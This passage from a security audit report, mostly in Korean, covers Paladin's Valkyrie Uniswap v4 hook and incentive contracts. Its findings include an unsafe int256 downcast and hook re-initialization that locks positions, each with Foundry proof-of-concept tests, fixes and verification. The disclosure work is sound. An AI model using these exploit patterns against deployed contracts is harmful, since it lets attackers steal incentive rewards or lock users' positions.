**Cyfrin:** 검증되었습니다. 0 금액 인출은 이제 상태 업데이트, 전송 및 이벤트 발생을 우회하여 조기 반환(early return)합니다.

\clearpage
## Low Risk


### Misleading liquidity value returned when adding liquidity

**Description:** 사용자가 두 훅 중 하나를 사용하여 풀에 유동성을 추가할 때, `addLiquidity()` 함수는 사용자가 `IncentivizedERC20` 형태로 받게 될 유동성의 양을 나타내는 값을 반환합니다; 그러나 아래 스니펫에서 볼 수 있듯이 반환된 값은 풀에 예치된 실제 유동성입니다:

```solidity
function addLiquidity(AddLiquidityParams calldata params)
    external
    payable
    nonReentrant
    ensure(params.deadline)
    returns (uint128 liquidity)
{
    ...
    liquidity = LiquidityAmounts.getLiquidityForAmounts(
        sqrtPriceX96,
        TickMath.getSqrtPriceAtTick(params.range.tickLower),
        TickMath.getSqrtPriceAtTick(params.range.tickUpper),
        params.amount0Desired,
        params.amount1Desired
    );

    if (rangeLiquidity == 0 && liquidity <= MINIMUM_LIQUIDITY) {
        revert LiquidityDoesntMeetMinimum();
    }
    // Add liquidity to the Pool
    BalanceDelta addedDelta = modifyLiquidity(
        params.key,
        params.range,
        IPoolManager.ModifyLiquidityParams({
            tickLower: params.range.tickLower,
            tickUpper: params.range.tickUpper,
            liquidityDelta: liquidity.toInt256(),
            salt: 0
        })
    );

    uint256 liquidityMinted;
    if (rangeLiquidity == 0) {
        // permanently lock the first MINIMUM_LIQUIDITY tokens
        liquidityMinted = liquidity - MINIMUM_LIQUIDITY;
        IncentivizedERC20(lpToken).mint(address(0), MINIMUM_LIQUIDITY);
        // Mint the LP tokens to the user
        IncentivizedERC20(lpToken).mint(params.to, liquidityMinted);
    } else {
        // Calculate the amount of LP tokens to mint
        (uint128 newRangeLiquidity,,) =
            poolManager.getPositionInfo(poolId, address(this), params.range.tickLower, params.range.tickUpper, 0);
        liquidityMinted =
            FullMath.mulDiv(IncentivizedERC20(lpToken).totalSupply(), liquidity, newRangeLiquidity - liquidity);
        // Mint the LP tokens to the user
        IncentivizedERC20(lpToken).mint(params.to, liquidityMinted);
    }

    ...
}
```

초기 최소 유동성 예치 시 `1e3`만큼을 차감하여 발행할 실제 `IncentivizedERC20` 토큰 양을 계산하므로, 이 반환 값은 부정확합니다. 또한 `IncentivizedERC20`의 가치와 유동성 가치가 디페깅(de-peg)되면, 이 함수는 발행된 양이 아니라 풀에 예치된 실제 유동성을 반환합니다.

```solidity
/// @return liquidity Amount of liquidity minted
```

위의 NatSpec 태그가 존재하지만, Uniswap 풀에 추가된 실제 유동성 양과 교환하여 발행된 `IncentivizedERC20` 토큰 양 사이의 대응 관계가 깨지기 때문에 이는 상당히 오해의 소지가 있습니다. 사용자와 외부 통합자 모두 나중에 유동성을 제거할 때 이 값을 참조할 가능성이 높으므로, 발행된 실제 토큰 양보다 큰 반환 값으로 유동성을 제거하려고 하면 revert 되기 때문에 잠재적으로 문제가 될 수 있습니다.

**Impact:** 유동성을 추가할 때 반환되는 값이 오해의 소지가 있으며 발행된 `IncentivizedERC20` 토큰을 정확하게 나타내지 않습니다. 이는 사용자, 통합자 및 기타 오프체인 인덱싱 인프라에 문제를 일으킬 수 있습니다.

**Proof of Concept:**
```solidity
function test_MisleadingReturnedLiquidityValue() public {
    initPool(key.currency0, key.currency1, IHooks(hookAddress), 3000, SQRT_PRICE_1_1);

    uint128 liquidity = fullRange.addLiquidity(
        FullRangeHook.AddLiquidityParams(
            key.currency0, key.currency1, 3000, 10e6, 10e6, 0, 0, address(this), MAX_DEADLINE
        )
    );

    (, address liquidityToken) = fullRange.poolInfo(id);

    IncentivizedERC20(liquidityToken).approve(address(fullRange), type(uint256).max);

    // The returned liquidity is used to remove but it fails due to misleading value
    FullRangeHook.RemoveLiquidityParams memory removeLiquidityParams =
        FullRangeHook.RemoveLiquidityParams(key.currency0, key.currency1, 3000, liquidity, MAX_DEADLINE);

    vm.expectRevert();
    fullRange.removeLiquidity(removeLiquidityParams);
}
```


**Recommended Mitigation:** `IncentivizedERC20` 토큰에 의해 발행된 실제 값이므로 대신 `liquidityMinted`를 반환하는 것을 고려하세요:

```diff
    function addLiquidity(AddLiquidityParams calldata params)
        external
        payable
        nonReentrant
        ensure(params.deadline)
--      returns (uint128 liquidity)
++      returns (uint128 liquidityMinted)
    {
        ...

        // Calculate the amount of liquidity to be added based on Currencies amounts
--      liquidity = LiquidityAmounts.getLiquidityForAmounts(
++      uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
            sqrtPriceX96,
            TickMath.getSqrtPriceAtTick(MIN_TICK),
            TickMath.getSqrtPriceAtTick(MAX_TICK),
            params.amount0Desired,
            params.amount1Desired
        );

        ...

        // @gas cache pool's liquidity token
        IncentivizedERC20 poolLiquidityToken = IncentivizedERC20(poolInfo[poolId].liquidityToken);

--      uint256 liquidityMinted;
        if (poolLiquidity == 0) {
            // permanently lock the first MINIMUM_LIQUIDITY tokens
            liquidityMinted = liquidity - MINIMUM_LIQUIDITY;
            poolLiquidityToken.mint(address(0), MINIMUM_LIQUIDITY);
            // Mint the LP tokens to the user
            poolLiquidityToken.mint(params.to, liquidityMinted);
        } else {
            // Calculate the amount of LP tokens to mint
--          liquidityMinted = FullMath.mulDiv(
++          liquidityMinted = uint128(FullMath.mulDiv(
                poolLiquidityToken.totalSupply(),
                liquidity,
                poolManager.getLiquidity(poolId) - liquidity
--          );
++          ));
            // Mint the LP tokens to the user
            poolLiquidityToken.mint(params.to, liquidityMinted);
        }

        ...
    }
```

**Paladin:** 커밋 [`fd9d2c9`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/fd9d2c9f3bac0665483ab0c7ec1e5e62f1e731e6)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 실제 발행된 유동성 금액이 반환됩니다.


### Missing tick validation when creating a new range in `MultiRangeHook`

**Description:** `MultiRangeHook`으로 구성된 풀에 유동성을 추가할 때는 먼저 풀을 초기화하고 원하는 범위를 생성해야 합니다. 사용자는 풀의 구성된 `tickSpacing`의 배수인 틱 범위에만 유동성을 추가할 수 있도록 제한되므로, 틱 간격이 `60`으로 구성된 풀에 대해 `[-50, 50]` 범위에 유동성을 추가하려고 시도하면 실패합니다. 이는 `Pool::modifyLiquidity` 내에서 호출되는 `TickBitmap::flipTick`에서 발생하는 `TickMisaligned()`로 인한 revert 때문입니다. 그러나 `MultiRangeHook::createRange`는 현재 틱 범위에 대해 유효성 검사를 수행하지 않습니다. 따라서 사용할 수 없는 `IncentivizedERC20` 토큰을 생성하는 잘못된 범위를 생성하여 호출자의 가스를 낭비하는 것이 가능합니다.

**Impact:** `MultiRangeHook` 내에서 사용할 수 없는 범위가 생성되어 `poolLpTokens` 배열에 추가될 수 있습니다.

**Proof of Concept:**
```solidity
function test_InvalidTickRangeCreation() public {
    int24 lowerTick = -90;
    int24 upperTick = 90;

    // Pool with 20 tick spacing
    initPool(key2.currency0, key2.currency1, IHooks(address(multiRange)), 1000, SQRT_PRICE_1_1);

    rangeKey = RangeKey(id2, lowerTick, upperTick);
    rangeId = rangeKey.toId();

    multiRange.createRange(key2, rangeKey);

    uint256 token0Amount = 100 ether;
    uint256 token1Amount = 100 ether;

    vm.expectRevert(abi.encodeWithSelector(TickBitmap.TickMisaligned.selector, lowerTick, int256(int24(20))));
    multiRange.addLiquidity(
        MultiRangeHook.AddLiquidityParams(
            key2, rangeKey, token0Amount, token1Amount, 99 ether, 99 ether, address(this), MAX_DEADLINE
        )
    );
}
```


**Recommended Mitigation:** 새로 생성된 범위를 풀 틱 간격과 비교하여 불일치가 없는지 확인하세요:
```diff
    function createRange(PoolKey calldata key, RangeKey calldata rangeKey) external {
++      if(
++          rangeKey.tickLower % key.tickSpacing != 0 ||
++          rangeKey.tickUpper % key.tickSpacing != 0
++      ) revert();


        PoolId poolId = key.toId();
        RangeId rangeId = rangeKey.toId();

        if (!initializedPools[poolId]) revert PoolNotInitialized();
        if (alreadyCreatedRanges[poolId][rangeId] || rangeLpToken[rangeId] != address(0)) revert RangeAlreadyCreated();
        alreadyCreatedRanges[poolId][rangeId] = true;

        ...
    }
```

**Paladin:** 커밋 [`0db4aea`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/0db4aea4eda83d3ddf3a655280474f7731866161)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 범위 틱이 이제 틱 간격에 대해 검증됩니다.


### Missing zero address validation in `BoostedIncentiveLogic`

**Description:** `BaseIncentiveLogic` 생성자와 달리, `BoostedIncentiveLogic`은 `_boostingPowerAdaptor`를 0 주소에 대해 검증하지 못하여, 이러한 방식으로 잘못 구성될 경우 DoS를 초래할 수 있습니다.

**Recommended Mitigation:**
```diff
    constructor(address _incentiveManager, uint256 _defaultFee, address _boostingPowerAdaptor)
        BaseIncentiveLogic(_incentiveManager, _defaultFee)
    {
++      if (_boostingPowerAdaptor == address(0)) revert();
        boostingPowerAdaptor = IBoostingPowerAdapter(_boostingPowerAdaptor);
    }
```

**Paladin:** 커밋 [`c3ee9d5`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/c3ee9d5bf57ccc0b479d2604f4725cd0fb604c57)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 생성자 인수가 이제 0 주소에 대해 검증됩니다.


### Value mistakenly sent to `PoolCreator` can be permanently locked

**Description:** `PoolCreator`는 Uniswap v4 풀을 생성하도록 설계된 간단한 컨트랙트입니다. `createPool()` 함수는 현재 `payable`로 표시되어 있지만, `PoolManager`에 전달되는 값이 없으므로 이는 필요하지 않습니다:

```solidity
function createPool(PoolKey calldata key, uint160 sqrtPriceX96) external payable returns (PoolId poolId, int24 tick) {
    poolId = key.toId();
    tick = poolManager.initialize(key, sqrtPriceX96);
}
```

환불이나 네이티브 토큰을 휩쓸(sweep) 수 있는 기능이 없으므로, 이 함수 호출과 함께 실수로 보낸 모든 가치는 영구적으로 잠깁니다.

**Recommended Mitigation:** 컨트랙트로 가치가 전송되는 것을 방지하기 위해 `payable` 키워드를 제거하세요.

**Paladin:** 커밋 [`b271724`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/b271724295605d571ea9f44231547d195ce600a0)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 함수는 더 이상 payable이 아닙니다.


### Unsafe downcast in `ValkyrieSubscriber::toInt256` could silently overflow
**Description:** 합리적인 소수점 자릿수를 가진 토큰의 경우 유동성 양이 `int256` 오버플로우에 근접할 가능성은 매우 낮지만, `ValkyrieSubscriber::toInt256`에는 `uint256`에서 `int256`으로의 안전하지 않은 다운캐스트가 있어 조용히 오버플로우될 수 있습니다:

```solidity
function toInt256(uint256 y) internal pure returns (int256 z) {
    z = int256(y);
}
```

이 함수는 `notifySubscribe()`, `notifyUnsubscribe()`, `notifyBurn()`과 함께 호출되므로 조용한 오버플로우는 인센티브 회계에 심각한 결과를 초래할 수 있습니다.

**Impact:** 악성 풀이 인센티브를 위해 추가될 가능성은 낮으므로 영향은 제한적입니다. 그럼에도 불구하고, 아래의 개념 증명은 공격자가 실제로 포지션을 구독 취소할 때 적은 양의 유동성 제거를 알림으로써 인센티브를 악용하는 방법을 보여줍니다.

**Proof of Concept:** 다음 테스트를 `ValkyrieSubscriber.t.sol`에 추가해야 합니다:

```solidity
function test_notifyUnsubscribe_Overflow() public {
    IncentivizedPoolId expectedId = IncentivizedPoolKey({ id: id, lpToken: address(0) }).toId();

    positionManager.notifySubscribe(0, EMPTY_BYTES);
    positionManager.notifySubscribe(5, EMPTY_BYTES);

    uint256 amount = uint256(type(int256).max);
    uint256 halfAmount = amount / 2;
    // add half the amount twice to overflow int256
    positionManager.notifyModifyLiquidity(5, int256(halfAmount), feeDelta);
    positionManager.notifyModifyLiquidity(5, int256(halfAmount), feeDelta);

    (IncentivizedPoolId receivedId, address account, int256 liquidityDelta) =
    incentiveManager.lastNotifyAddData(address(subscriber));

    assertEq(IncentivizedPoolId.unwrap(receivedId), IncentivizedPoolId.unwrap(expectedId));
    assertEq(account, owner2);
    assertEq(liquidityDelta, (int256(halfAmount)));

    // now remove full amount
    console.log("unsubscribing: notifies removal of all liquidity");
    positionManager.notifyUnsubscribe(5);

    (receivedId, account, liquidityDelta) =
    incentiveManager.lastNotifyRemoveData(address(subscriber));

    assertEq(IncentivizedPoolId.unwrap(receivedId), IncentivizedPoolId.unwrap(expectedId));
    assertEq(account, owner2);
    uint256 deltaU256 = uint256(-liquidityDelta);
    console.log("actually notified removal of %s liquidity due to overflow", deltaU256 / 1e18);
    assertGt(amount, deltaU256);
    console.log("unsubscribe removed all %s liquidity but reported different delta", amount / 1e18);
}
```

Output:
```bash
[PASS] test_notifyUnsubscribe_Overflow() (gas: 256275)
Logs:
  unsubscribing: notifies removal of all liquidity
  actually notified removal of 220 liquidity due to overflow
  unsubscribe removed all 57896044618658097711785492504343953926634992332820282019728 liquidity but reported different delta
```

**Recommended Mitigation:**
```diff
    function toInt256(uint256 y) internal pure returns (int256 z) {
++   if(y > uint256(type(int256).max)) revert("Overflow");
        z = int256(y);
    }
```

**Paladin:** 커밋 [`82ec6ff`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/82ec6ffafed645deab127f69c8c3798ba976f621)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 OpenZeppelin `SafeCast` 라이브러리를 사용하여 확인된(checked) 다운캐스트를 수행합니다.


### Positions can be locked by malicious re-initialization in the event of multiple `ValkyrieSubscriber` contracts being deployed

**Description:** `IncentiveManager::notifyInitialize`는 현재 풀 식별자에 해당하는 훅이 이미 할당되었는지 확인하지 않습니다:

```solidity
function notifyInitialize(PoolId id, address lpToken) external onlyAllowedHooks {
    IncentivizedPoolId _id = _convertToIncentivizedPoolId(id, lpToken);
    listedPools[_id] = true;
    poolLinkedHook[_id] = msg.sender;
}
```

따라서 이 함수가 다시 호출될 수 있으면 허가된 역할을 빼앗을 수 있어 이전 훅이 다른 메서드를 실행하지 못하게 할 수 있습니다. 현재 `ValkyrieSubscriber` 컨트랙트를 여러 번 배포할 계획이 없는 것으로 이해되지만, `IncentiveManager::notifyInitialize`의 유효성 검사 누락으로 인해 위치가 새로운 구독자에서 악의적으로 다시 초기화될 수 있습니다.

`BaseHook`이 초기화 불변성을 강제하고 이러한 훅 위치와 구독자의 위치 사이에 겹침이 없으므로 현재 훅에는 문제가 되지 않습니다.

**Proof of Concept:** 두 개의 서로 다른 `ValkyrieSubscriber` 인스턴스(`subscriberA` 및 `subscriberB`)가 있다고 상상해 보세요:
1. 사용자가 `subscriberA`에 대한 포지션에서 `Notifier::subscribe`를 호출하여 다음을 실행합니다:

```solidity
function notifySubscribe(uint256 tokenId, bytes memory /*data*/) external override onlyPositionManager {
    (PoolKey memory poolKey,) = positionManager.getPoolAndPositionInfo(tokenId);
    PoolId poolId = poolKey.toId();

    if(!_initializedPools[poolId]) {
        if (address(incentiveManager) != address(0)) {
            incentiveManager.notifyInitialize(poolId, address(0));
        }
        _initializedPools[poolId] = true;
    }
    ...
}
```

첫 번째 사용자 구독은 `IncentiveManager::notifyInitialize`를 트리거하여 연결된 훅을 `subscriberA`에 할당합니다. `subscriberA`에 대한 후속 구독은 더 이상 이 메서드를 트리거하지 않습니다.

2. 악의적인 사용자가 `subscriberB`를 가리키는 동일한 Uniswap 풀의 포지션에서 `Notifier::subscribe`를 호출합니다.
이 다른 구독자는 동일한 함수를 트리거하고 `poolLinkedHook`은 `subscriberB`에 할당됩니다.

3. 이 시점에서 `subscriberA`에 구독한 모든 사용자는 더 이상 포지션과 상호 작용할 수 없습니다. 상호 작용을 시도하면 포지션에 대한 모든 작업이 `IncentiveManager`를 호출하는 `subscriberA`에 대한 알림을 트리거하지만, 다음 유효성 검사로 인해 실행이 실패합니다:

```solidity
function notifyAddLiquidty(PoolId id, address lpToken, address account, int256 liquidityDelta)
    external
    onlyAllowedHooks
{
    ...
    if (poolLinkedHook[_id] != msg.sender) revert NotLinkedHook();
    ...
}

function notifyRemoveLiquidty(PoolId id, address lpToken, address account, int256 liquidityDelta)
    external
    onlyAllowedHooks
{
    ...
    if (poolLinkedHook[_id] != msg.sender) revert NotLinkedHook();
    ...
}

function _notifySwap(PoolId id, address lpToken) internal {
    ...
    if (poolLinkedHook[_id] != msg.sender) revert NotLinkedHook();
    ...
}
```

정직한 사용자는 여전히 `subscriberA`에 구독할 수 있지만, 이는 포지션이 영원히 잠기는 결과를 초래할 것입니다.

다음 테스트는 `ValkyrieSubscriber.t.sol`에 배치되어야 합니다:

```solidity
function test_MoreThanOneSubscriber() public {
    IncentiveManager incentiveManagerRealImplementation = new IncentiveManager();
    ValkyrieSubscriber subscriberA = new ValkyrieSubscriber(IIncentiveManager(address(incentiveManagerRealImplementation)), PositionManager(payable(address(positionManager))));
    ValkyrieSubscriber subscriberB = new ValkyrieSubscriber(IIncentiveManager(address(incentiveManagerRealImplementation)), PositionManager(payable(address(positionManager))));
    incentiveManagerRealImplementation.addHook(address(subscriberA));
    incentiveManagerRealImplementation.addHook(address(subscriberB));

    IncentivizedPoolId expectedId = IncentivizedPoolKey({ id: id, lpToken: address(0) }).toId();

    // Mock function to route the call to the specific subscriber
    positionManager.setSubscriber(subscriberA);

    // Some user subscribes their position number 0 to subscriberA
    positionManager.notifySubscribe(0, EMPTY_BYTES);

    // Mock function to route the call to the specific subscriber
    positionManager.setSubscriber(subscriberB);

    // Some other user subscribes their position number 5 to subscriberA
    positionManager.notifySubscribe(5, EMPTY_BYTES);

    // Mock function to route the call to the specific subscriber
    positionManager.setSubscriber(subscriberA);

    // At this point the first user that subscribed to SubscriberA will not be able to do anything
    vm.expectRevert();
    positionManager.notifyUnsubscribe(0);

    vm.expectRevert();
    positionManager.notifyBurn(0, address(this), pos2, 195e18, feeDelta);

    vm.expectRevert();
    positionManager.notifyModifyLiquidity(0, 35e18, feeDelta);
}
```

**Impact:** 단일 구독자 컨트랙트만 배포하려는 의도로 인해 현재 영향은 제한적입니다. 권장되는 완화 조치를 적용하지 않고 변경되는 경우 심각도가 크게 증가할 것입니다.

**Recommended Mitigation:** `IncentiveManager::notifyInitialize`에 다음 유효성 검사를 추가하세요:

```diff
    function notifyInitialize(PoolId id, address lpToken) external onlyAllowedHooks {
        IncentivizedPoolId _id = _convertToIncentivizedPoolId(id, lpToken);
++      require(poolLinkedHook[_id] == address(0), "Hook already linked");
        listedPools[_id] = true;
        poolLinkedHook[_id] = msg.sender;
    }
```

**Paladin:** 커밋 [`ae96366`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/ae963669375a24716c9f857c3c0bfdfef558725e)으로 수정되었습니다.

**Cyfrin:** 검증되었습니다. `ValkyrieSubscriber`가 관리하는 풀은 더 이상 다시 초기화될 수 없습니다.


### Inability to remove hooks and Incentive Systems from the Incentive Manager

**Description:** 잠재적인 동기화 및 알림 문제를 방지하기 위해 현재 인센티브 관리자에서 훅과 인센티브 시스템을 제거하는 메커니즘이 없는 것으로 이해됩니다. 그러나 이러한 컨트랙트 중 하나에서 버그나 다른 공격이 발견되어 오작동을 일으키는 경우, 일시 중지 기능을 구현하거나 특정 작업(예: 훅에서의 예치, 보상 예치 등)을 방지하는 다른 유형의 동결 메커니즘을 고려하는 것이 적절할 수 있습니다.

**Paladin:** 커밋 [`9d6cbff`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/9d6cbffca07145358c5ceef54d772267fadf5604)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 로직 컨트랙트는 이제 일시 중지 가능하며 개별 나열된 훅을 동결할 수 있습니다.

\clearpage
## Informational


### The updated version of `BaseHook` should be used

**Description:** 추상 `BaseHook` 컨트랙트는 `uniswap/v4-periphery` 리포지토리에서 복사된 것으로 [명시](https://github.com/PaladinFinance/Valkyrie/blob/6b97685d127c97bc369c0613943f45a547d89b18/src/hooks/base/BaseHook.sol#L14)되어 있지만, 이 버전의 컨트랙트는 오래된 것입니다. `onlyByManager` 제어자는 `onlyPoolManager` 제어자를 대신 사용할 수 있으므로 필요하지 않습니다. 또한 주석 처리된 코드는 제거할 수 있습니다.

**Recommended Mitigation:** 파일을 복사하는 대신 업데이트된 `BaseHook` 컨트랙트를 가져오기(import)로 사용하는 것이 이상적입니다.

**Paladin:** 인정함(Acknowledged), 그러나 변경 없음 => 복사된 `BaseHook` 버전은 실제로 `uniswap/v4-periphery`의 이전 버전이지만, 이미 모든 훅 메서드를 처리하므로 이 과거 버전을 선호하며 모든 메서드가 internal이 되도록 Valkyrie Hooks를 리팩토링할 필요가 없습니다. 전체 훅이 `IHook` 인터페이스를 준수하는 한, 유효한 베이스로 간주합니다.

**Cyfrin:** 인정함(Acknowledged).


### Unused custom errors and constants can be removed

**Description:** * `MultiRangeHook`은 `RangeNotCreated()` 사용자 지정 오류를 [선언](https://github.com/PaladinFinance/Valkyrie/blob/6b97685d127c97bc369c0613943f45a547d89b18/src/hooks/MultiRangeHook.sol#L68-L69)하지만 사용되지 않습니다. `MultiRangeHook::addLiquidity` 내에서 관련 확인을 수행하는 것이 합리적일 것입니다; 그러나 해당 LP 토큰이 `address(0)`인 경우 `RangeNotInitialized()` 사용자 지정 오류로 revert 하여 [유효성 검사](https://github.com/PaladinFinance/Valkyrie/blob/6b97685d127c97bc369c0613943f45a547d89b18/src/hooks/MultiRangeHook.sol#L281-L282)가 이미 수행되고 처리되므로 두 경우를 모두 포함합니다. 따라서 `RangeNotCreated()`는 필요하지 않을 수 있으며 제거할 수 있습니다.

```solidity
 address lpToken = rangeLpToken[params.range.toId()];
if (lpToken == address(0)) revert RangeNotInitialized();
```

 * `MAX_INT` 상수도 `MultiRangeHook`에 유사하게 선언되어 있지만 사용되지 않으므로 제거할 수 있습니다.

아래에 표시된 `FullRangeHook::beforeInitialize`와 달리, `MultiRangeHook::beforeInitialize`는 실제로는 사용되지 않는 `TickSpacingNotDefault()` 사용자 지정 오류 선언에도 불구하고 기본 틱 간격을 강제하지 않습니다.

```solidity
function beforeInitialize(address, PoolKey calldata key, uint160)
    external
    override
    onlyPoolManager
    returns (bytes4)
{
    if (key.tickSpacing != 60) revert TickSpacingNotDefault();
    ...
}
```

이 오류가 필요하지 않으면 제거해야 합니다. 그렇지 않으면 필요한 유효성 검사를 수행해야 합니다.

* `DistributionEndTooEarly()` 사용자 지정 오류는 `BasicIncentiveLogic`, `BoostedIncentiveLogic` 및 `TimeWeightedIncentiveLogic`에서 선언되었지만 사용되지 않습니다. 대신, 기간은 `InvalidDuration()` 오류와 함께 `MIN_DURATION`에 대해 검증되는 것으로 보입니다.

* `ConversionUnderflow()`는 `ValkyrieSubscriber`에서 선언되었지만 사용되지 않습니다.

**Paladin:** 커밋 [`2f727a5`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/2f727a58d47199ff7226350ef8573bf79a2064e7)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 사용되지 않는 오류 및 상수가 제거되었습니다.


### Insufficient validation on the pool key in liquidity-modifying functions

**Description:** `FullRangeHook::addLiquidity` 및 `FullRangeHook::removeLiquidity`는 훅 자체를 통해 생성된 풀에서만 호출할 수 있어야 합니다. 그러나 풀 키에 대한 유효성 검사가 부족하여 이것이 엄격하게 시행되지 않습니다. 대신, 현재 로직은 `address(0)` 유동성 토큰에서 `IncentivizedERC20` 함수가 호출될 때 발생하는 revert 동작에 의존합니다.

**Recommended Mitigation:** 이 요구 사항을 명시적으로 강제하기 위해 다음 유효성 검사를 추가해야 합니다:

```diff
++ if (poolInfo[poolId].liquidityToken == address(0)) revert InvalidLiquidityToken();
```

**Paladin:** 커밋 [`5eef1b0`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/5eef1b068bf7d221794c7744ed32745b587bd771)로 수정되었습니다.

**Cyfrin:** 검증되었습니다. 추가 유효성 검사가 추가되었습니다.


### Various typographical errors should be fixed

**Description:** 다음은 수정해야 할 코드 및 문서의 오타 목록입니다.

**Recommended Mitigation:** * `FullRangeHook`:
```diff
contract FullRangeHook is BaseHook, ReentrancyGuard, ITokenizedHook {
    ...
--  /// @notice Erorr raised if the tick spacing is not default
++  /// @notice Error raised if the tick spacing is not default
    error TickSpacingNotDefault();
    ...
}
```

* `MultiRangeHook`:
```diff
contract MultiRangeHook is BaseHook, ReentrancyGuard, ITokenizedHook {
    ...
--  /// @notice Erorr raised if the tick spacing is not default
++  /// @notice Error raised if the tick spacing is not default
    error TickSpacingNotDefault();
    ...
--  /// @notice Fees sotred from collected fees for each Range
++  /// @notice Fees stored from collected fees for each Range
    mapping(PoolId => mapping(RangeId => RangeStoredFees)) public rangesStoredFees;
}
```

* `ValkyrieHooklet`:
```diff
contract ValkyrieHooklet is IHooklet {
    ...

    /*
    This Hooklet needs the following flags in this contract
--  least siginificant bits of the deployement address :
++  least significant bits of the deployment address :
    uint160 internal constant BEFORE_TRANSFER_FLAG = 1 << 11;
    uint160 internal constant AFTER_INITIALIZE_FLAG = 1 << 8;
    uint160 internal constant AFTER_DEPOSIT_FLAG = 1 << 6;
    uint160 internal constant BEFORE_WITHDRAW_FLAG = 1 << 5;
    uint160 internal constant AFTER_SWAP_FLAG = 1;
    */

    constructor(IIncentiveManager _incentiveManager, IBunniHub _bunniHub) {
        incentiveManager = _incentiveManager;
        bunniHub = _bunniHub;
    }
    ...
    /// @inheritdoc IHooklet
    function beforeSwap(
        address,
        PoolKey calldata,
        IPoolManager.SwapParams calldata
    )
        external
        returns (
            bytes4 selector,
--            bool feeOverriden,
++            bool feeOverridden,
            uint24 fee,
            bool priceOverridden,
            uint160 sqrtPriceX96
        )
    {
        return (ValkyrieHooklet.beforeSwap.selector, false, 0, false, 0);
    }

    /// @inheritdoc IHooklet
    function beforeSwapView(
        address,
        PoolKey calldata,
        IPoolManager.SwapParams calldata
    )
        external
        view
        override
        returns (
            bytes4 selector,
--          bool feeOverriden,
++          bool feeOverridden,
            uint24 fee,
            bool priceOverridden,
            uint160 sqrtPriceX96
        )
    {
        return (ValkyrieHooklet.beforeSwap.selector, false, 0, false, 0);
    }
    ...
}
```

* `BaseIncentiveLogic`:
```diff
abstract contract BaseIncentiveLogic is Owner, ReentrancyGuard, IIncentiveLogic {
    ...
--  /// @notice State fo the reward data for an incentivized pool
++  /// @notice State for the reward data for an incentivized pool
    struct RewardData {
        /// @notice Timestamp at which the distribution ends
        uint32 endTimestamp;
        /// @notice Timestamp at which the last update was made
        uint32 lastUpdateTime;
        /// @notice Current rate per second for the distribution
        uint96 ratePerSec;
        /// @notice Last updated reward per token
        uint96 rewardPerTokenStored;
    }
    ...
    /// @notice Event emitted when fees are retrieved
--    event FeesRetreived(address indexed token, uint256 amount);
++    event FeesRetrieved(address indexed token, uint256 amount);
    ...
}
```

* `BasicIncentiveLogic`:
```diff
contract BasicIncentiveLogic is BaseIncentiveLogic {
    ...
    /// @inheritdoc BaseIncentiveLogic
    function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
        external
        override
        nonReentrant
    {
        ...
        if (endTimestampCache < block.timestamp) {
            ...
        } else {
--          // Calculates the remianing duration left for the current distribution
++          // Calculates the remaining duration left for the current distribution
            uint256 remainingDuration = endTimestampCache - block.timestamp;
            ...
        }

        ...
    }
```

* `BoostedIncentiveLogic`:
```diff
contract BoostedIncentiveLogic is BaseIncentiveLogic {
    ...
--  /// @dev Boostless factor for user whithout boosting power
++  /// @dev Boostless factor for user without boosting power
    uint256 private constant BOOSTLESS_FACTOR = 40;
    }
    ...
    function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
        external
        override
        nonReentrant
    {
        ...
        if (endTimestampCache < block.timestamp) {
            ...
        } else {
--          // Calculates the remianing duration left for the current distribution
++          // Calculates the remaining duration left for the current distribution
            uint256 remainingDuration = endTimestampCache - block.timestamp;
            ...
        }

        ...
--  /// @dev Updates the boosted balance of an user for an incentivized pool
++  /// @dev Updates the boosted balance of a user for an incentivized pool
    /// @param id Id of the incentivized pool
    /// @param account Address of the user
    function _updateUserBoostedBalance(IncentivizedPoolId id, address account) internal {
        ...
    }
    ...
--  /// @notice Updates the user reward state then the boosted balance of an user for an incentivized pool
++  /// @notice Updates the user reward state then the boosted balance of a user for an incentivized pool
    /// @param id Id of the incentivized pool
    /// @param account Address of the user
    function updateUserBoostedBalance(IncentivizedPoolId id, address account) external nonReentrant {
        ...
    }
}
```

* `TimeWeightedIncentiveLogic`:
```diff
contract TimeWeightedIncentiveLogic is BaseIncentiveLogic {
    /// @notice Event emitted when rewards are withdrawn from a pool
    event RewardsWithdrawn(
--      IncentivizedPoolId indexed id, address indexed token, address indexed recepient, uint256 amount
++      IncentivizedPoolId indexed id, address indexed token, address indexed recipient, uint256 amount
    );
    ...
--  /// @notice Rewards checckpoints for an user
++  /// @notice Rewards checkpoints for an user
    struct RewardCheckpoint {
        /// @notice Timestamp of the checkpoint
        uint128 timestamp;
        /// @notice Duration of the position in the pool
        uint128 duration;
    }
    ...
    function _depositRewards(
        IncentivizedPoolId id,
        address token,
        uint256 amount,
        uint256 duration,
        uint256 requiredDuration,
        RewardType rewardType
    ) internal {
        ...
        if (endTimestampCache < block.timestamp) {
            ...
        } else {
            ...
--          // Calculates the remianing duration left for the current distribution
++          // Calculates the remaining duration left for the current distribution
            uint256 remainingDuration = endTimestampCache - block.timestamp;
            ...
        }

        IncentiveManager(incentiveManager).addPoolIncentiveSystem(id);
        // Sync pool total liquidity if not already done
        if(!poolSynced[id]) {
            _syncPoolLiquidity(id);
            poolSynced[id] = true;
        }

        emit RewardsDeposited(id, token, amount, duration);
    }
    ...
--  function _earnedTimeWeigthed(IncentivizedPoolId id, address token, address account, uint256 newRewardPerToken)
++  function _earnedTimeWeighted(IncentivizedPoolId id, address token, address account, uint256 newRewardPerToken)
        internal
        view
        returns (uint256 earnedAmount, uint256 leftover)
    {
        ...
    }
}
```

